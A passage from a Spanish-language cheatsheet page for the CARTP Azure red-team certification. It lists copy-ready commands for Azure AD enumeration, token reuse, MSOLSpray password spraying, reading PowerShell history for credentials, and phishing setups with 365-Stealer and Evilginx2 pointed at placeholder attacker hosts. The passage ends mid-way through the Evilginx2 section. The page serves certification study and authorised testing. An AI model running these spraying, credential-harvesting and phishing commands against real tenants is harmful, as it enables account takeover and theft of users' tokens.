@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#050510">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>CARTP Cheatsheet - Azure Red Team Professional | Guarina0x0</title>
+    <meta name="description" content="CARTP (Certified Azure Red Team Professional) - Cheatsheet completa de Azure AD Attack Techniques: Enumeraci&oacute;n, Tokens, Privilege Escalation, Lateral Movement, Persistence y m&aacute;s.">
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="manifest" href="manifest.json">
+    <link rel="canonical" href="https://guarina0x0.github.io/cartp-cheatsheet.html">
+    <meta property="og:url" content="https://guarina0x0.github.io/cartp-cheatsheet.html">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="CARTP Cheatsheet - Azure Red Team Professional | Guarina0x0">
+    <meta property="og:description" content="CARTP (Certified Azure Red Team Professional) - Cheatsheet completa de Azure AD Attack Techniques: Enumeracion, Tokens, Privilege Escalation, Lateral Movement, Persistence y mas.">
+    <meta property="og:site_name" content="Guarina0x0">
+    <meta name="twitter:title" content="CARTP Cheatsheet - Azure Red Team Professional | Guarina0x0">
+    <meta name="twitter:description" content="CARTP (Certified Azure Red Team Professional) - Cheatsheet completa de Azure AD Attack Techniques: Enumeracion, Tokens, Privilege Escalation, Lateral Movement, Persistence y mas.">
+    <meta property="og:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta name="twitter:site" content="@Guarina0x0">
+    <meta name="twitter:creator" content="@Guarina0x0">
+    <meta property="og:locale" content="es_ES">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="CARTP Cheatsheet - Azure AD Red Team Attack Techniques">
+    <meta name="author" content="Guarina0x0">
+    <meta name="keywords" content="CARTP, Certified Azure Red Team Professional, Azure AD, cloud pentesting, privilege escalation, tokens, PRT attacks, cheatsheet, red team">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&family=Exo+2:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "CARTP Cheatsheet - Azure Red Team",
+        "description": "CARTP (Certified Azure Red Team Professional) - Cheatsheet de Azure AD enumeration, tokens, phishing, privilege escalation y mas.",
+        "author": {"@type": "Person", "name": "Guarina0x0", "url": "https://guarina0x0.github.io"},
+        "publisher": {"@type": "Person", "name": "Guarina0x0"},
+        "url": "https://guarina0x0.github.io/cartp-cheatsheet.html",
+        "datePublished": "2026-02-14",
+        "dateModified": "2026-02-14",
+        "inLanguage": "es",
+        "isPartOf": {
+            "@type": "CollectionPage",
+            "name": "Cheatsheets Arsenal",
+            "url": "https://guarina0x0.github.io/cheatsheets.html"
+        }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            {"@type": "ListItem", "position": 1, "name": "Portal", "item": "https://guarina0x0.github.io/"},
+            {"@type": "ListItem", "position": 2, "name": "Cheatsheets", "item": "https://guarina0x0.github.io/cheatsheets.html"},
+            {"@type": "ListItem", "position": 3, "name": "CARTP - Azure Red Team"}
+        ]
+    }
+    </script>
+    <link rel="stylesheet" href="styles.css">
+    <script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t);})()</script>
+</head>
+<body>
+<a href="#main-content" class="skip-link">Saltar al contenido</a>
+<div class="reading-progress" id="readingProgress"></div>
+
+<div class="grid-overlay"></div>
+
+<!-- Nav -->
+<nav class="nav" id="nav">
+    <a href="/" class="nav-brand">
+        <div class="nav-logo"><span>G</span></div>
+        <span class="nav-title">GUARINA0x0</span>
+    </a>
+    <ul class="nav-links" id="navLinks">
+        <li><a href="/">Portal</a></li>
+        <li><a href="/#categorias">Categor&iacute;as</a></li>
+        <li><a href="cheatsheets.html">Cheatsheets</a></li>
+        <li><a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer">GitHub</a></li>
+    </ul>
+    <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+    </button>
+    <button class="search-trigger" id="searchTrigger" aria-label="Search">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        <kbd>Ctrl+K</kbd>
+    </button>
+    <div class="nav-hamburger" id="hamburger" role="button" aria-label="Toggle navigation menu" tabindex="0">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</nav>
+
+<!-- Breadcrumbs -->
+<nav class="breadcrumbs" aria-label="Breadcrumb">
+    <a href="/">Portal</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="cheatsheets.html">Cheatsheets</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">CARTP</span>
+</nav>
+
+<!-- Hero -->
+<section class="page-hero">
+    <div class="page-hero-tag">// Dimensi&oacute;n C-800 :: Certified Azure Red Team Professional</div>
+    <h1><span class="accent">CARTP</span> Cheatsheet</h1>
+    <p class="page-hero-desc">Comandos y t&eacute;cnicas de Azure AD Red Team recopilados durante la preparaci&oacute;n y examen del CARTP. Desde Discovery hasta Azure AD Connect Abuse y PRT Attacks.</p>
+    <div class="page-hero-badges">
+        <span class="badge">Azure AD</span>
+        <span class="badge">AzureAD Module</span>
+        <span class="badge">Az PowerShell</span>
+        <span class="badge">Tokens &amp; APIs</span>
+        <span class="badge">Phishing</span>
+        <span class="badge">Privilege Escalation</span>
+        <span class="badge">Lateral Movement</span>
+        <span class="badge">Persistence</span>
+    </div>
+    <a class="credential-verify" href="https://www.credential.net/f4d8f49f-d851-4cde-8167-62067255b04a#acc.m2td8i0C" target="_blank" rel="noopener noreferrer">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+        Verificar Credencial
+    </a>
+</section>
+
+<div class="page-layout">
+
+<!-- Sidebar -->
+<aside class="sidebar" role="complementary" aria-label="Navigation sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <ul class="sidebar-nav">
+        <li><a href="#discovery"><span class="num">01</span> Azure AD Discovery &amp; Recon</a></li>
+        <li><a href="#userenum"><span class="num">02</span> User &amp; Group Enumeration</a></li>
+        <li><a href="#apps"><span class="num">03</span> Applications &amp; Service Principals</a></li>
+        <li><a href="#roles"><span class="num">04</span> Admin Roles &amp; RBAC</a></li>
+        <li><a href="#azpowershell"><span class="num">05</span> Az PowerShell Enumeration</a></li>
+        <li><a href="#azcli"><span class="num">06</span> Azure CLI Enumeration</a></li>
+        <li><a href="#tokens"><span class="num">07</span> Tokens &amp; API Access</a></li>
+        <li><a href="#spray"><span class="num">08</span> Password Spray &amp; Creds</a></li>
+        <li><a href="#phishing"><span class="num">09</span> Phishing &amp; Illicit Consent</a></li>
+        <li><a href="#privesc"><span class="num">10</span> Privilege Escalation</a></li>
+        <li><a href="#lateral"><span class="num">11</span> Lateral Movement</a></li>
+        <li><a href="#adconnect"><span class="num">12</span> Azure AD Connect Abuse</a></li>
+        <li><a href="#resources"><span class="num">13</span> Azure Resources Abuse</a></li>
+        <li><a href="#automation"><span class="num">14</span> Automation Account Abuse</a></li>
+        <li><a href="#enumtools"><span class="num">15</span> Advanced Enumeration Tools</a></li>
+        <li><a href="#prt"><span class="num">16</span> PRT Attacks</a></li>
+        <li><a href="#proxy"><span class="num">17</span> App Proxy &amp; Intune Abuse</a></li>
+        <li><a href="#github"><span class="num">18</span> GitHub &amp; Function App Exploitation</a></li>
+    </ul>
+</aside>
+
+<!-- Main Content -->
+<main class="content" id="main-content" role="main">
+
+<!-- 01 AZURE AD DISCOVERY & RECON -->
+<div class="section-block reveal" id="discovery">
+    <div class="section-number">// 01</div>
+    <h2>Azure AD <span class="accent">Discovery &amp; Recon</span></h2>
+
+    <h3>Tenant Discovery (Unauthenticated)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">URLs / API</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check if tenant exists &amp; get federation info</span>
+https://login.microsoftonline.com/getuserrealm.srf?login=&lt;USER&gt;@&lt;DOMAIN&gt;&amp;xml=1
+
+<span class="comment"># Get Tenant ID</span>
+https://login.microsoftonline.com/&lt;DOMAIN&gt;/.well-known/openid-configuration
+
+<span class="comment"># Validate email IDs</span>
+https://login.microsoftonline.com/common/GetCredentialType</pre></div>
+    </div>
+
+    <h3>AADInternals - Tenant Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Import AADInternals</span>
+Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
+
+<span class="comment"># Get tenant name, authentication, brand name and domain</span>
+Get-AADIntLoginInformation -UserName &lt;USER&gt;@&lt;DOMAIN&gt;
+
+<span class="comment"># Get Tenant ID</span>
+Get-AADIntTenantID -Domain &lt;DOMAIN&gt;
+
+<span class="comment"># Get all tenant domains</span>
+Get-AADIntTenantDomains -Domain &lt;DOMAIN&gt;
+
+<span class="comment"># Full external reconnaissance</span>
+Invoke-AADIntReconAsOutsider -DomainName &lt;DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>Email Discovery &amp; Subdomain Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># o365creeper - Validate emails</span>
+C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\email.txt -o C:\AzAD\Tools\validemails.txt
+
+<span class="comment"># MicroBurst - Enumerate Azure subdomains</span>
+Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
+Invoke-EnumerateAzureSubDomains -Base &lt;TARGET_BASE&gt; -Verbose
+
+<span class="comment"># MicroBurst - Enumerate Azure Blobs</span>
+. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
+Invoke-EnumerateAzureBlobs -Base &lt;TARGET_BASE&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 02 USER & GROUP ENUMERATION -->
+<div class="section-block reveal" id="userenum">
+    <div class="section-number">// 02</div>
+    <h2>User &amp; <span class="accent">Group Enumeration</span></h2>
+
+    <h3>AzureAD Module - Connect &amp; User Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Import and connect</span>
+Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
+$passwd = ConvertTo-SecureString "&lt;PASSWORD&gt;" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential("&lt;USER&gt;@&lt;DOMAIN&gt;", $passwd)
+Connect-AzureAD -Credential $creds
+
+<span class="comment"># Get current session info</span>
+Get-AzureADCurrentSessionInfo
+Get-AzureADTenantDetail
+
+<span class="comment"># Enumerate all users</span>
+Get-AzureADUser -All $true
+Get-AzureADUser -ObjectId &lt;USER&gt;@&lt;DOMAIN&gt; | fl *
+Get-AzureADUser -SearchString "admin"
+Get-AzureADUser -All $true | ?{$_.DisplayName -match "admin"}
+
+<span class="comment"># Users synced from on-prem (has on-prem SID)</span>
+Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
+
+<span class="comment"># Cloud-only users (no on-prem SID)</span>
+Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
+
+<span class="comment"># Objects created/owned by a user</span>
+Get-AzureADUser | Get-AzureADUserCreatedObject
+Get-AzureADUserOwnedObject -ObjectId &lt;USER&gt;@&lt;DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>Group Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># List all groups</span>
+Get-AzureADGroup -All $true
+Get-AzureADGroup -SearchString "admin" | fl *
+
+<span class="comment"># Dynamic Membership groups</span>
+Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
+
+<span class="comment"># Groups synced from on-prem vs cloud-only</span>
+Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
+Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
+
+<span class="comment"># Members of a group</span>
+Get-AzureADGroupMember -ObjectId &lt;GROUP_ID&gt;
+
+<span class="comment"># Groups and roles where user is member</span>
+Get-AzureADUserMembership -ObjectId &lt;USER&gt;@&lt;DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>Device Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># All devices</span>
+Get-AzureADDevice -All $true
+Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
+
+<span class="comment"># Device owners and registered users</span>
+Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
+Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
+
+<span class="comment"># Devices owned/registered by a user</span>
+Get-AzureADUserOwnedDevice -ObjectId &lt;USER&gt;@&lt;DOMAIN&gt;
+Get-AzureADUserRegisteredDevice -ObjectId &lt;USER&gt;@&lt;DOMAIN&gt;
+
+<span class="comment"># Intune managed devices</span>
+Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}</pre></div>
+    </div>
+</div>
+
+<!-- 03 APPLICATIONS & SERVICE PRINCIPALS -->
+<div class="section-block reveal" id="apps">
+    <div class="section-number">// 03</div>
+    <h2>Applications &amp; <span class="accent">Service Principals</span></h2>
+
+    <h3>Application Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># All application objects</span>
+Get-AzureADApplication -All $true
+Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"}
+
+<span class="comment"># Application password credentials</span>
+Get-AzureADApplicationPasswordCredential
+
+<span class="comment"># Owner of an application</span>
+Get-AzureADApplication -ObjectId &lt;APP_OBJECT_ID&gt; | Get-AzureADApplicationOwner | fl *
+
+<span class="comment"># Apps where user has a role</span>
+Get-AzureADUser -ObjectId &lt;USER&gt;@&lt;DOMAIN&gt; | Get-AzureADUserAppRoleAssignment | fl *
+
+<span class="comment"># Apps where group has a role</span>
+Get-AzureADGroup -ObjectId &lt;GROUP_ID&gt; | Get-AzureADGroupAppRoleAssignment | fl *</pre></div>
+    </div>
+
+    <h3>Service Principal Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># All service principals</span>
+Get-AzureADServicePrincipal -All $true
+Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
+
+<span class="comment"># SPs with key credentials (password)</span>
+Get-AzureADServicePrincipal -All $true | %{if(Get-AzureADServicePrincipalKeyCredential -ObjectID $_.ObjectID){$_}}
+
+<span class="comment"># Owner of a service principal</span>
+Get-AzureADServicePrincipal -ObjectId &lt;SP_ID&gt; | Get-AzureADServicePrincipalOwner | fl *
+
+<span class="comment"># Objects owned/created by SP</span>
+Get-AzureADServicePrincipal -ObjectId &lt;SP_ID&gt; | Get-AzureADServicePrincipalOwnedObject
+Get-AzureADServicePrincipal -ObjectId &lt;SP_ID&gt; | Get-AzureADServicePrincipalCreatedObject
+
+<span class="comment"># Group/role membership of SP</span>
+Get-AzureADServicePrincipal -ObjectId &lt;SP_ID&gt; | Get-AzureADServicePrincipalMembership | fl *</pre></div>
+    </div>
+</div>
+
+<!-- 04 ADMINISTRATIVE ROLES & RBAC -->
+<div class="section-block reveal" id="roles">
+    <div class="section-number">// 04</div>
+    <h2>Administrative Roles &amp; <span class="accent">RBAC</span></h2>
+
+    <h3>Directory Roles</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># All role templates</span>
+Get-AzureADDirectoryRoleTemplate
+
+<span class="comment"># Enabled roles</span>
+Get-AzureADDirectoryRole
+
+<span class="comment"># Members of Global Administrator role</span>
+Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
+
+<span class="comment"># Custom directory roles (AzureADPreview)</span>
+Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
+Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $false} | select DisplayName</pre></div>
+    </div>
+
+    <h3>Administrative Units</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerate Administrative Units</span>
+Get-AzureADMSAdministrativeUnit
+
+<span class="comment"># Members of an AU</span>
+Get-AzureADMSAdministrativeUnit -Id &lt;AU_ID&gt;
+Get-AzureADMSAdministrativeUnitMember -Id &lt;AU_ID&gt;
+
+<span class="comment"># Scoped role membership of an AU</span>
+Get-AzureADMSScopedRoleMembership -Id &lt;AU_ID&gt; | fl *</pre></div>
+    </div>
+
+    <h3>Azure RBAC Role Assignments</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># All Azure RBAC role assignments</span>
+Get-AzRoleAssignment
+
+<span class="comment"># Role assignments for a specific user</span>
+Get-AzRoleAssignment -SignInName &lt;USER&gt;@&lt;DOMAIN&gt;
+
+<span class="comment"># Role assignments for a resource scope</span>
+Get-AzRoleAssignment -Scope &lt;RESOURCE_ID&gt;
+
+<span class="comment"># Get role definition details</span>
+Get-AzRoleDefinition -Name "&lt;ROLE_NAME&gt;"</pre></div>
+    </div>
+</div>
+
+<!-- 05 AZ POWERSHELL ENUMERATION -->
+<div class="section-block reveal" id="azpowershell">
+    <div class="section-number">// 05</div>
+    <h2>Az PowerShell <span class="accent">Enumeration</span></h2>
+
+    <h3>Connect &amp; Context</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Connect with credentials</span>
+$creds = Get-Credential
+Connect-AzAccount -Credential $creds
+
+<span class="comment"># Current context and subscriptions</span>
+Get-AzContext
+Get-AzContext -ListAvailable
+Get-AzSubscription</pre></div>
+    </div>
+
+    <h3>Resource Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># All resources visible to current user</span>
+Get-AzResource
+
+<span class="comment"># Users and groups</span>
+Get-AzADUser
+Get-AzADUser -UserPrincipalName &lt;USER&gt;@&lt;DOMAIN&gt;
+Get-AzADUser -SearchString "admin"
+Get-AzADGroup
+Get-AzADGroupMember -ObjectId &lt;GROUP_ID&gt;
+
+<span class="comment"># Application and service principal objects</span>
+Get-AzADApplication
+Get-AzADServicePrincipal
+
+<span class="comment"># VMs, Web Apps, Functions, Storage, KeyVault</span>
+Get-AzVM | fl
+Get-AzWebApp
+Get-AzFunctionApp
+Get-AzStorageAccount | fl
+Get-AzKeyVault
+
+<span class="comment"># Resource groups</span>
+Get-AzResourceGroup</pre></div>
+    </div>
+</div>
+
+<!-- 06 AZURE CLI ENUMERATION -->
+<div class="section-block reveal" id="azcli">
+    <div class="section-number">// 06</div>
+    <h2>Azure CLI <span class="accent">Enumeration</span></h2>
+
+    <h3>Login &amp; Account Info</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash / CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Login with credentials</span>
+az login -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
+
+<span class="comment"># Login without subscription</span>
+az login -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; --allow-no-subscriptions
+
+<span class="comment"># Login with Managed Identity</span>
+az login --identity
+
+<span class="comment"># Tenant and subscription info</span>
+az account tenant list
+az account subscription list
+az ad signed-in-user show</pre></div>
+    </div>
+
+    <h3>User, Group &amp; App Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash / CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Users</span>
+az ad user list --output table
+az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
+az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
+
+<span class="comment"># Groups</span>
+az ad group list
+az ad group show -g "&lt;GROUP_NAME&gt;"
+az ad group member list -g "&lt;GROUP_NAME&gt;" --query "[].[displayName]" -o table
+
+<span class="comment"># Applications &amp; Service Principals</span>
+az ad app list --query "[].[displayName]" -o table
+az ad app owner list --id &lt;APP_ID&gt;
+az ad sp list --all --query "[].[displayName]" -o table
+az ad sp owner list --id &lt;SP_ID&gt; --query "[].[displayName]" -o table
+
+<span class="comment"># VMs and KeyVaults</span>
+az vm list
+az keyvault list
+az keyvault secret list --vault-name &lt;VAULT_NAME&gt;
+az keyvault secret show --name &lt;SECRET_NAME&gt; --vault-name &lt;VAULT_NAME&gt;
+
+<span class="comment"># Role assignments</span>
+az role assignment list --all --assignee "&lt;OBJECT_ID&gt;"</pre></div>
+    </div>
+</div>
+
+<!-- 07 TOKENS & API ACCESS -->
+<div class="section-block reveal" id="tokens">
+    <div class="section-number">// 07</div>
+    <h2>Tokens &amp; <span class="accent">API Access</span></h2>
+
+    <h3>Get Access Tokens</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Get ARM Access Token</span>
+Get-AzAccessToken
+(Get-AzAccessToken).Token
+
+<span class="comment"># Get MS Graph Access Token</span>
+Get-AzAccessToken -ResourceTypeName MSGraph
+(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token
+
+<span class="comment"># Az CLI - Get tokens</span>
+az account get-access-token
+az account get-access-token --resource-type aad-graph</pre></div>
+    </div>
+
+    <h3>Connect with Tokens</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Connect Az with Access Token</span>
+Connect-AzAccount -AccountId &lt;ACCOUNT_ID&gt; -AccessToken &lt;ACCESS_TOKEN&gt;
+
+<span class="comment"># Connect with both ARM and Graph tokens</span>
+Connect-AzAccount -AccountId &lt;ACCOUNT_ID&gt; -AccessToken &lt;ARM_TOKEN&gt; -MicrosoftGraphAccessToken &lt;GRAPH_TOKEN&gt;
+
+<span class="comment"># Connect with Access Token + KeyVault Token</span>
+Connect-AzAccount -AccessToken &lt;ARM_TOKEN&gt; -AccountId &lt;ACCOUNT_ID&gt; -KeyVaultAccessToken &lt;KEYVAULT_TOKEN&gt;
+
+<span class="comment"># Connect AzureAD with AAD Graph token</span>
+Connect-AzureAD -AadAccessToken &lt;AAD_TOKEN&gt; -TenantId &lt;TENANT_ID&gt; -AccountId &lt;OBJECT_ID&gt;</pre></div>
+    </div>
+
+    <h3>REST API Calls</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># List subscriptions via REST</span>
+$Token = "&lt;ACCESS_TOKEN&gt;"
+$URI = "https://management.azure.com/subscriptions?api-version=2020-01-01"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+(Invoke-RestMethod @RequestParams).value
+
+<span class="comment"># List resources in a subscription</span>
+$URI = "https://management.azure.com/subscriptions/&lt;SUB_ID&gt;/resources?api-version=2020-10-01"
+
+<span class="comment"># Check permissions on a resource</span>
+$URI = "https://management.azure.com/&lt;RESOURCE_ID&gt;/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
+
+<span class="comment"># MS Graph API call</span>
+$URI = "https://graph.microsoft.com/v1.0/users"</pre></div>
+    </div>
+
+    <div class="note">Tokens are cached in C:\Users\&lt;USERNAME&gt;\.Azure - Check for saved tokens with Save-AzContext</div>
+</div>
+
+<!-- 08 PASSWORD SPRAY & CREDENTIAL ATTACKS -->
+<div class="section-block reveal" id="spray">
+    <div class="section-number">// 08</div>
+    <h2>Password Spray &amp; <span class="accent">Credential Attacks</span></h2>
+
+    <h3>MSOLSpray - Password Spraying</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># MSOLSpray - Brute force Azure AD</span>
+. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
+Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password "&lt;PASSWORD&gt;" -Verbose</pre></div>
+    </div>
+
+    <h3>Extract Credentials from History/Transcripts</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># PowerShell command history</span>
+cat C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+<span class="comment"># PowerShell transcripts</span>
+cat C:\Transcripts\&lt;DATE&gt;\PowerShell_transcript.&lt;HOSTNAME&gt;.*.txt</pre></div>
+    </div>
+</div>
+
+<!-- 09 PHISHING & ILLICIT CONSENT -->
+<div class="section-block reveal" id="phishing">
+    <div class="section-number">// 09</div>
+    <h2>Phishing &amp; <span class="accent">Illicit Consent</span></h2>
+
+    <h3>Illicit Consent Grant Attack</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check if users can consent to apps (AzureADPreview)</span>
+(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
+<span class="comment"># If output = ManagePermissionGrantsForSelf.microsoft-user-default-legacy -&gt; users can consent</span>
+
+<span class="comment"># 365-Stealer setup</span>
+<span class="comment"># 1. Register multitenant app with redirect URI https://&lt;ATTACKER_IP&gt;/login/authorized</span>
+<span class="comment"># 2. Add Delegated permissions: user.read, User.ReadBasic.All</span>
+<span class="comment"># 3. Create client secret</span>
+<span class="comment"># 4. Run XAMPP + copy 365-stealer to C:\xampp\htdocs</span>
+<span class="comment"># 5. Configure CLIENTID, REDIRECTURL, CLIENTSECRET</span>
+<span class="comment"># 6. Send phishing link to target</span></pre></div>
+    </div>
+
+    <h3>Evilginx2 - Token Phishing</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Evilginx2 setup</span>
+evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
+config domain &lt;ATTACKER_DOMAIN&gt;
+config ip &lt;ATTACKER_IP&gt;
+phishlets hostname o365 login.&lt;ATTACKER_DOMAIN&gt;
+phishlets get-hosts o365
+phishlets enable o365
+
+<span class="comment"># Create lure and get phishing URL</span>
+lures create o365
